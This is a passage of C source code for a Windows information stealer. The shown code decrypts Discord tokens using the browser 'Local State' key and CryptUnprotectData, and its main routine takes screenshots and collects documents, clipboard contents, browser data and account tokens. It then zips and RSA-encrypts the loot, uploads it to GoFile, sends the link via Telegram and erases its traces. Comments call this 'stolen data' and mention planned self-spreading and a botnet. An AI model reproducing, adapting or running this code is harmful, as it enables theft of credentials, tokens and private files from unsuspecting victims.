            }
        }
    }

    // If no token was found, free the allocated memory and return.
    if (!encrypted_token)
    {
        free(data);
        return 0;
    }

    // Extract the IV (initialization vector) and the encrypted token data from the decoded token.
    char *iv_start = encrypted_token + 3; // IV starts after the first 3 bytes.
    unsigned char iv[12]; // IV is 12 bytes long.
    memcpy(iv, iv_start, 12); // Copy the IV.
    char *encrypted_data_start = encrypted_token + 15; // The actual encrypted data starts after the IV (12 bytes + 3 bytes).
    size_t encrypted_dataSize = encrypted_tokenSize - 15; // Calculate the size of the encrypted data.
    unsigned char *encrypted_data = (unsigned char *)malloc(encrypted_dataSize * sizeof(unsigned char)); // Allocate memory for the encrypted data.
    memcpy(encrypted_data, encrypted_data_start, encrypted_dataSize); // Copy the encrypted data.

    // Construct the path to the "Local State" file to retrieve the encryption key.
    char LocalStateFile[MAX_PATH];
    char *DiscordRoot = FilePath; // Use the FilePath to derive the Discord root folder.
    int LengthToRemove = strlen(strstr(FilePath, "Local")); // Find and calculate how much of the path to remove.
    DiscordRoot[strlen(DiscordRoot) - LengthToRemove] = '\0'; // Truncate the path to the root.
    sprintf(LocalStateFile, "%sLocal State", DiscordRoot); // Append "Local State" to the root path.

    // Open the "Local State" file and read its content into memory.
    FILE *fp2 = fopen(LocalStateFile, "rb");
    fseek(fp2, 0, SEEK_END); // Move to the end to get the file size.
    long file_size2 = ftell(fp2); // Get the total size of the file.
    fseek(fp2, 0, SEEK_SET); // Reset to the start of the file.
    char *data2 = (char *)malloc(file_size2 * sizeof(char)); // Allocate memory for the file content.
    fread(data2, sizeof(char), file_size2, fp2); // Read the file into the buffer.
    fclose(fp2); // Close the file.

    // Variables to hold the encrypted key found in the "Local State" file.
    char *encrypted_key = NULL;
    size_t encrypted_keySize = 0;
    DWORD dword_encrypted_keySize = 0;

    // Loop through the "Local State" file to locate the encrypted key, identified by "encrypted_key":" prefix.
    for (size_t i = 0; i <= file_size2 - strlen("encrypted_key\":\""); ++i)
    {
        // Compare the current part of the data with the key identifier.
        if (memcmp(data2 + i, "encrypted_key\":\"", strlen("encrypted_key\":\"")) == 0)
        {
            char *base642 = data2 + i + strlen("encrypted_key\":\""); // Start of the base64-encoded encrypted key.
            char *end_of_token2 = strchr(base642, '"'); // Locate the end of the key string.
            if (end_of_token2 != NULL)
            {
                *end_of_token2 = '\0'; // Null-terminate the key string.
                Base64DecodingFunc(base642, &encrypted_key, &dword_encrypted_keySize); // Decode the base64 key.
                encrypted_keySize = (size_t)dword_encrypted_keySize; // Store the key size.
                break; // Exit the loop after finding and decoding the key.
            }
        }
    }

    // If no encrypted key was found, free memory and return.
    if (!encrypted_key)
    {
        free(data2);
        return 0;
    }

    // Load the crypt32.dll library to use the CryptUnprotectData function to decrypt the key.
    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"crypt32.dll"; // Name of the DLL.
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
    dllName.Buffer = dllNameBuffer;
    ULONG dllCharacteristics = 0;
    PVOID moduleHandle = NULL;

    // Load the library dynamically.
    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
    if (!NT_SUCCESS(STATUS) || moduleHandle == NULL)
    {
        return -1; // If loading fails, return an error.
    }

    // Retrieve the address of the CryptUnprotectData function from crypt32.dll.
    ANSI_STRING procName;
    CHAR procNameBuffer[] = "CryptUnprotectData";
    procName.Length = (USHORT)strlen(procNameBuffer);
    procName.MaximumLength = procName.Length + 1;
    procName.Buffer = procNameBuffer;
    PVOID CryptUnprotectDataProcAddress = NULL;

    NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName, 0, &CryptUnprotectDataProcAddress);
    if (!NT_SUCCESS(STATUS1) || CryptUnprotectDataProcAddress == NULL)
    {
        UnloadLib(moduleHandle); // Unload the DLL on failure.
        return -2;
    }

    // Define a function pointer for CryptUnprotectData.
    CryptUnprotectDataFunc pCryptUnprotectData = (CryptUnprotectDataFunc)CryptUnprotectDataProcAddress;

    // Adjust the encrypted key data to remove unnecessary parts.
    encrypted_keySize -= 5; // Remove the first 5 bytes.
    encrypted_key += 5;

    // Prepare the input and output structures for decryption.
    DATA_BLOB DataIn;
    DataIn.pbData = (BYTE *)encrypted_key; // Encrypted key as input.
    DataIn.cbData = (DWORD)encrypted_keySize; // Size of the encrypted key.
    DATA_BLOB DataOut;
    DATA_BLOB *pDataOut = &DataOut;
    LPWSTR pDescrOut = NULL; // Description output, not used.
    BOOL result = pCryptUnprotectData(&DataIn, &pDescrOut, NULL, NULL, NULL, 0, pDataOut); // Decrypt the key.

    // Store the decrypted master key.
    char *masters_key = (char *)pDataOut->pbData;
    DWORD masters_keySize = pDataOut->cbData;

    // Prepare for AES-256-GCM decryption of the token.
    const BYTE *Token = encrypted_data;
    DWORD TokenSize = encrypted_dataSize - 16;
    ULONG decryptedTokenSize = TokenSize;
    const BYTE *aad = NULL;
    const DWORD authTagSize = 16;
    BYTE authTag[16];
    BYTE decryptedData[256];
    ULONG decryptedDataLength = encrypted_dataSize - 16;

    // Extract the authentication tag from the encrypted data.
    for (int i = 0; i < authTagSize; i++)
    {
        authTag[i] = encrypted_data[i + (encrypted_dataSize - 16)];
    }

    // Perform AES-256-GCM decryption on the encrypted token.
    NTSTATUS status = AES_256_GCM(Token, TokenSize, aad, 0, iv, 12, authTag, authTagSize, (BYTE *)masters_key, masters_keySize, decryptedData, decryptedDataLength);

    // Check if the decryption was successful.
    if (!NT_SUCCESS(status) || decryptedDataLength != 72)
    {
        // If decryption failed, clean up and return.
        LocalFree(pDataOut->pbData);
        LocalFree(pDescrOut);
        UnloadLib(moduleHandle);
        free(encrypted_data);
        free(encrypted_key);
        free(data);
        free(data2);
        return 0;
    }

    // Copy the decrypted data (token) to a plaintext buffer.
    char PlainText[256];
    strncpy(PlainText, decryptedData, decryptedDataLength);
    PlainText[decryptedDataLength] = '\0';

    // Check if the token has already been stored.
    int AlreadyWritten = 0;
    if (*StoreTokensLength > 0)
    {
        for (int i = 0; i < *StoreTokensLength; i++)
        {
            if (strcmp(StoreTokens[i], PlainText) == 0)
            {
                AlreadyWritten = 1;
                break;
            }
        }
    }

    // If the token is new, store it in the StoreTokens array.
    if (AlreadyWritten == 0)
    {
        strcpy(StoreTokens[*StoreTokensLength], PlainText);
        (*StoreTokensLength)++;
    }

    // Clean up all allocated resources.
    LocalFree(pDataOut->pbData);
    LocalFree(pDescrOut);
    UnloadLib(moduleHandle);
    free(encrypted_data);
    free(data);
    free(data2);

    return 0;
}
int CompressAndEncryptData(char *temp, char *currentuser, char *OutEncPath) {
    // Zip files.
    int index = 0;
    char Files[20][MAX_PATH] = {0};
    SubfolderFileFinder(Files, temp, &index);
    const WCHAR *files[20];
    char zipPath[MAX_PATH];
    sprintf(zipPath, "%s\\AppData\\Local\\Temp", currentuser);
    int size = MultiByteToWideChar(CP_UTF8, 0, zipPath, -1, NULL, 0);
    WCHAR *ZipOutput = (WCHAR *)malloc(size * sizeof(WCHAR));
    MultiByteToWideChar(CP_UTF8, 0, zipPath, -1, ZipOutput, size);
    for (int i = 0; i < index; i++) { int size = MultiByteToWideChar(CP_UTF8, 0, Files[i], -1, NULL, 0); files[i] = (WCHAR *)malloc(size * sizeof(WCHAR)); MultiByteToWideChar(CP_UTF8, 0, Files[i], -1, (LPWSTR)files[i], size); }
    CompressFile(files, index, ZipOutput);
    for (int i = 0; i < index; i++) { free((void *)files[i]); }
    free(ZipOutput);

    OKAY("Zipped stolen data.");

    // Remove old folder
    remove_directory(temp);
    INFO("Removed data storage folder.\n\n\n\n\n");

    // RSA encrypt the ZIP file.
    char BizPath[MAX_PATH];
    sprintf(BizPath, "%s\\BIZ.zip", zipPath);  
    char BizEncPath[MAX_PATH];
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQESTUVWXYZ";
    int size2 = 16;
    char str[40];
    if (size2) {
        --size2;
        for (size_t n = 0; n < size2; n++) {
            int key = rand() % (int) (sizeof charset - 1);
            str[n] = charset[key];
        }
        str[size2] = '\0';
    }
    sprintf(BizEncPath, "%s\\FUM_%s.enc", zipPath, str);
    INFO("Output location should be %s if it succeeds.", BizEncPath);
    if (RSAEncrypt(BizPath, BizEncPath) != 0) { WARN("Error in RSA encrypting the ZIP file!"); return 1; }
    OKAY("RSA Encrypted the zip file and output it to %s !\n\n\n\n\n", BizEncPath);
    strcpy(OutEncPath, BizEncPath);
    return 0;
}


int main() {
    srand(time(NULL));
    // Get function addresses of ntdll LdrLoadLib, LdrUnloadLib and LdrGetProcedureAddress, we need it for winhttp.dll and other dll loading later on.
    if (GetHandleNTAPI(&LoadLib, &GetProcAdd, &UnloadLib) != 0) { return 1; }
    OKAY("Loaded NTAPI!\n\n\n\n\n");


    // Make temp dir.
    char *currentuser = getenv("USERPROFILE");
    char temp[256];
    snprintf(temp, sizeof(temp), "%s\\AppData\\Local\\Temp\\bizfum", currentuser);
    mkdir(temp);
    OKAY("Temporary directory for storing gathered data is created! Location is %s.\n\n\n\n\n", temp);


    // Take screenshot and save it as a bitmap file to the temporary directory.
    Screenshot(temp);


    // Start the stealing of documents and pictures. Check first if +5GB free space before that.
    // Even 1GB would probably be enough, but set to 8GB just to be safe. ( Caused some problems on my machine... )
    INFO("Counting available disk space...");
    DWORD sectorsPerCluster; DWORD bytesPerSector; DWORD numberOfFreeClusters; DWORD totalNumberOfClusters;
    if (GetDiskFreeSpaceW(L"C:\\", &sectorsPerCluster, &bytesPerSector, &numberOfFreeClusters, &totalNumberOfClusters)) {
        ULONGLONG freeSpace = (ULONGLONG)numberOfFreeClusters * sectorsPerCluster * bytesPerSector;
        INFO("Free space: %d GB", freeSpace/1000000000);
        if ((freeSpace/1000000000) >= 8) {
            INFO("Enough free space to start stealing files...");
            StealDocuments(temp);
        }
        else {
            WARN("Not enough free space to steal documents and pictures.\n\n\n\n\n");
        }
    } else {
        WARN("Error getting disk space: %lu\n", GetLastError());
    }


    // Get clipboard contents.
    Clipboard(temp);


    // Steal game cookies or credentials.
    // In progress.


    // Here starts the stealing of browser password, cookies and history.
    Browsers(temp, currentuser);
    // In progress.


    // Steal Discord, Telegram and some other apps tokens.
    AccountTokens(temp, currentuser);
    // Discord for now. Other applications in progress.


    // Self spreading.
    // In progress.


    // Compress the folder with stolen data and encrypt using a RSA public key.
    char OutEncPath[MAX_PATH];
    CompressAndEncryptData(temp, currentuser, OutEncPath);


    // Upload the stolen file to GoFile through their API.
    INFO("Starting uploading of the encrypted file...");
    INFO("Getting best GoFile server to upload the file to...");
    char ServerBuf[8] = "";
    if ( GetGoFileServer(ServerBuf) == 0 ){
        OKAY("Using Subdomain: %s\n", ServerBuf);   
    }
    char Link[30];
    if ( UploadGoFile(Link, OutEncPath, ServerBuf) == 0 ) {
        OKAY("Uploaded File. The link is %s\n", Link);
    }

    // Send the Download Link to Telegram.
    SendTelegram(Link);

    // Do cleanup stuff. Remove files left, remove logs etc.
    Clean(OutEncPath);

    // Botnet based on Telegram.
    // Not in near future. :P


    return 0;
}
